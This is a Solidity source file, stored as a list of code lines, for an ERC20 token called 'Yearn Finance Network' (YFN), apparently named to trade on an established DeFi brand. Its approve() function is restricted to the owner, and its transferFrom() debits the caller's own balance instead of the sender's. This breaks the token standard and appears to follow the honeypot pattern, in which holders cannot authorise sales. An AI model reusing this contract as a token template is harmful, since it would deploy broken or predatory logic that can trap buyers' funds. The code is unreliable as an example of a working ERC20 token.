['pragma solidity =0.5.16;\n', 'interface ERC20Interface {\n', '    function transfer(address to, uint tokens) external returns (bool success);\n', '    function transferFrom(address from, address to, uint tokens) external returns (bool success);\n', '    function balanceOf(address tokenOwner) external view returns (uint balance);\n', '    function approve(address spender, uint tokens) external returns (bool success);\n', '    function allowance(address tokenOwner, address spender) external view returns (uint remaining);\n', '    function totalSupply() external view returns (uint);\n', '\n', '    event Transfer(address indexed from, address indexed to, uint tokens);\n', '    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);\n', '}\n', '\n', 'contract SafeMath {\n', '    function safeAdd(uint a, uint b) public pure returns (uint c) {\n', '        c = a + b;\n', '        require(c >= a);\n', '    }\n', '    function safeSub(uint a, uint b) public pure returns (uint c) {\n', '        require(b <= a);\n', '        c = a - b;\n', '    }\n', '    function safeMul(uint a, uint b) public pure returns (uint c) {\n', '        c = a * b;\n', '        require(a == 0 || c / a == b);\n', '    }\n', '    function safeDiv(uint a, uint b) public pure returns (uint c) {\n', '        require(b > 0);\n', '        c = a / b;\n', '    }\n', '}\n', 'contract Owned {\n', '    address public owner;\n', '    address public newOwner;\n', '\n', '    event OwnershipTransferred(address indexed _from, address indexed _to);\n', '\n', '    constructor() public {\n', '        owner = msg.sender;\n', '    }\n', '\n', '    modifier onlyOwner {\n', '        require(msg.sender == owner, "you are not the owner");\n', '        _;\n', '    }\n', '\n', '    function transferOwnership(address _newOwner) public onlyOwner {\n', '        newOwner = _newOwner;\n', '    }\n', '    function acceptOwnership() public {\n', '        require(msg.sender == newOwner, "you are not the new owner");\n', '        emit OwnershipTransferred(owner, newOwner);\n', '        owner = newOwner;\n', '        newOwner = address(0);\n', '    }\n', '}\n', '\n', 'contract YearnFinanceNetwork is ERC20Interface, SafeMath, Owned {\n', '    string public name;\n', '    string public symbol;\n', '    uint8 public decimals;\n', '    uint public totalSupply;\n', '    mapping(address => uint) public balances;\n', '    mapping(address => mapping(address => uint)) public allowed;\n', '   \n', '   \n', '     constructor () public {\n', '        name = "Yearn Finance Network";\n', '        symbol = "YFN";\n', '        decimals = 18;\n', '        totalSupply = 300000*10**uint(decimals);\n', '        balances[msg.sender] = totalSupply;\n', '    }\n', '       \n', '    function transfer(address to, uint value) public returns(bool) {\n', '        require(balances[msg.sender] >= value);\n', '        balances[msg.sender] -= value;\n', '        balances[to] += value;\n', '        emit Transfer(msg.sender, to, value);\n', '        return true;\n', '    }\n', '   \n', '    function transferFrom(address from, address to, uint value) public returns(bool) {\n', '        uint allowance = allowed[from][msg.sender];\n', '        require(balances[msg.sender] >= value && allowance >= value);\n', '        allowed[from][msg.sender] -= value;\n', '        balances[msg.sender] -= value;\n', '        balances[to] += value;\n', '        emit Transfer(msg.sender, to, value);\n', '        return true;\n', '    }\n', '   \n', '    function approve(address spender, uint value) public onlyOwner returns(bool) {\n', '        require(spender != msg.sender);\n', '        allowed[msg.sender][spender] = value;\n', '        emit Approval(msg.sender, spender, value);\n', '        return true;\n', '    }\n', '   \n', '    function allowance(address owner, address spender) public view returns(uint) {\n', '        return allowed[owner][spender];\n', '    }\n', '   \n', '    function balanceOf(address owner) public view returns(uint) {\n', '        return balances[owner];\n', '    }\n', '   \n', '}']